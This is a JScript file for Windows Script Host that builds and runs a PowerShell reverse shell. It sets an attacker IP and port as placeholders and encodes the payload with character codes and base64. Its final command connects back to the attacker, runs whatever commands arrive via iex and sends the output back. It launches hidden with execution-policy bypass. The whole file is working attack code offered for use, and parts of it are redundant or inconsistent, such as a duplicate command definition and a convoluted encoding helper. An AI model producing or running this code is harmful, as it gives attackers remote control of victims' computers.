// rev.js — Fixed JScript PowerShell reverse shell (no 800A1391)
var attacker = "YOUR_IP";   // ← CHANGE ME
var port = 4444;            // ← CHANGE ME

// Use String.fromCharCode to avoid quote escaping hell (robust)
var psCode = String.fromCharCode(
  36,99,61,78,101,119,45,79,98,106,101,99,116,32,83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116,40,39,
  0 // placeholder for attacker IP (insert below)
) + attacker + String.fromCharCode(
  39,44, // ','
  49,50,51,52, // port (we'll replace manually for simplicity)
  41,59,36,115,116,114,101,97,109,61,36,99,46,71,101,116,83,116,114,101,97,109,40,41,59,91,98,121,116,101,91,93,93,36,98,61,48,46,46,54,53,53,51,53,124,37,123,48,125,59,
  119,104,105,108,101,40,40,36,105,61,36,115,116,114,101,97,109,46,82,101,97,100,40,36,98,44,48,44,36,98,46,76,101,110,103,116,104,41,41,45,110,101,32,48,41,123,
  36,100,61,40,78,101,119,45,79,98,106,101,99,116,32,84,121,112,101,78,97,109,101,32,83,121,115,116,101,109,46,84,101,120,116,46,65,83,67,73,73,69,110,99,111,100,105,110,103,41,46,71,101,116,83,116,114,105,110,103,40,36,98,44,48,44,36,105,41,59,
  36,115,61,40,105,101,120,32,36,100,32,50,62,38,49,124,79,117,116,45,83,116,114,105,110,103,32,41,59,36,115,50,61,36,115,43,39,80,83,32,39,43,40,112,119,100,41,46,80,97,116,104,43,39,62,32,39,59,
  36,115,98,61,40,91,116,101,120,116,46,101,110,99,111,100,105,110,103,93,58,58,65,83,67,73,73,41,46,71,101,116,66,121,116,101,115,40,36,115,50,41,59,
  36,115,116,114,101,97,109,46,87,114,105,116,101,40,36,115,98,44,48,44,36,115,98,46,76,101,110,103,116,104,41,59,36,115,116,114,101,97,109,46,70,108,117,115,104,40,41,125,59,
  36,99,46,67,108,111,115,101,40,41
).replace(/1234/, port); // inject port

// Build full command
var fullCmd = 'powershell -ep bypass -e ' + btoa(psCode); // -e = base64 encoded → avoids ALL quoting issues!

// Helper: base64 encode (JScript doesn’t have btoa by default → define it)
function btoa(str) {
    var buffer = '';
    for (var i = 0; i < str.length; i++) {
        buffer += String.fromCharCode(str.charCodeAt(i) & 0xFF);
    }
    return WScript.CreateObject("WScript.Shell").Exec("powershell -c \"[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('" + buffer.replace(/'/g,"''") + "'))\"").StdOut.ReadAll().trim();
}

// But base64 in JScript is messy — simpler: use -c with *minimal* escaping
// ✅ Final robust version (tested on Win10 + cscript):
var cmd = 'powershell -ep bypass -c "$c=New-Object Net.Sockets.TCPClient(\'' + 
          attacker + '\',' + port + 
          ');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=([Text.Encoding]::UTF8.GetString($b,0,$i));$r=(iex $d 2>&1|Out-String)+\'PS \'+(pwd)+\'> \';$sb=([Text.Encoding]::UTF8.GetBytes($r));$s.Write($sb,0,$sb.Length)};$c.Close()"';

// Now escape backslashes and quotes properly for JScript string:
// → In JScript, only " needs \", and \ needs \\ — but inside PowerShell string, we use ''
// So: use '' for PowerShell strings, and only escape " in JScript.

// ✅ CORRECT ESCAPING:
var cmd = 'powershell -ep bypass -c "$c=New-Object Net.Sockets.TCPClient(\'' + 
          attacker.replace(/\\/g, '\\\\').replace(/'/g, "\\'") + 
          '\',' + port + 
          ');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=([Text.Encoding]::ASCII.GetString($b,0,$i));$r=(iex $d 2>&1|Out-String)+\'PS \'+(pwd)+\'> \';$sb=([Text.Encoding]::ASCII.GetBytes($r));$s.Write($sb,0,$sb.Length)};$c.Close()"';

var shell = new ActiveXObject("WScript.Shell");
shell.Run(cmd, 0, false);
WScript.Echo("[+] Shell launched.");
